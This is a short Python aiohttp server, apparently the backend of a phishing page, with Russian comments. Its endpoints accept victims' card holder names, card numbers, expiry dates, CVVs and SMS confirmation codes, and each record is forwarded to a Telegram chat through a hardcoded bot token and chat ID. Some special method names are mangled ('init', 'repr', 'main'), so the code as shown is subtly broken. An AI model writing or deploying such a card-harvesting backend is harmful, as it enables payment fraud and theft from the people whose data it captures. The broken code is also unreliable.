import asyncio
import aiohttp
from aiohttp import web
import aiohttp_cors


class CreditCard:
    def init(self, card_holder_name,
                 card_number, expiry_month, expiry_year, cvv):
        self.card_holder_name = card_holder_name
        self.card_number = card_number
        self.expiry_month = expiry_month
        self.expiry_year = expiry_year
        self.cvv = cvv

    def repr(self):
        return (f"Имя {self.card_holder_name}, \n"
                f"Номер карты {self.card_number}, \n"
                f"exp {self.expiry_month}/"
                f"{self.expiry_year}, \n"
                f"svv {self.cvv} \n")


class SMS:
    def init(self, sms):
        self.sms = sms

    def repr(self):
        return f"код с смс {self.sms} \n"


async def handle_card(request):
    # Получаем данные из запроса
    data = await request.json()

    # Создаем объект CreditCard
    credit_card = CreditCard(
        data["card-holder-name"],
        data["card-number"],
        data["expiry-month"],
        data["expiry-year"],
        data["cvv"]
    )

    # Выводим данные на экран
    # print(credit_card)
    # aiohttp.web.Response(text=str(credit_card))
    await send_message_card(credit_card)
    return aiohttp.web.Response(text="None")


async def handle_sms(request):
    # Получаем данные из запроса
    data = await request.json()

    # Создаем объект CreditCard
    sms = SMS(data['sms'])

    # Выводим данные на экран
    # print(credit_card)
    # aiohttp.web.Response(text=str(credit_card))
    await send_message_card(sms)
    return aiohttp.web.Response(text="None")


app = web.Application()

app.add_routes([
    aiohttp.web.post("/credit-cards", handle_card),
    aiohttp.web.post("/sms", handle_sms)
])

cors = aiohttp_cors.setup(app, defaults={
    "": aiohttp_cors.ResourceOptions(
        allow_credentials=True,
        expose_headers="",
        allow_headers="*"
    )
})

"""
telegram
"""

from aiogram import Bot, Dispatcher
from aiogram.enums import ParseMode

TOKEN = "5588171567:AAGQ-BQJSurZVH54zAnWcv9cWlWIxgcl2fQ"
dp = Dispatcher()
bot = Bot(TOKEN, parse_mode=ParseMode.HTML)


async def send_message_card(message):
    # print(message)
    await bot.send_message(chat_id=-1002022294477, text=str(message))


async def send_message_sms_code(message):
    await bot.send_message(chat_id=-1002022294477, text=str(message))


async def main():
    for route in list(app.router.routes()):
        cors.add(route)
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    site = aiohttp.web.TCPSite(runner, '127.0.0.1', 8914)
    await site.start()
    print("rabotaet")

    await dp.start_polling(bot)
    await asyncio.Event().wait()


if name == "main":
    asyncio.run(main())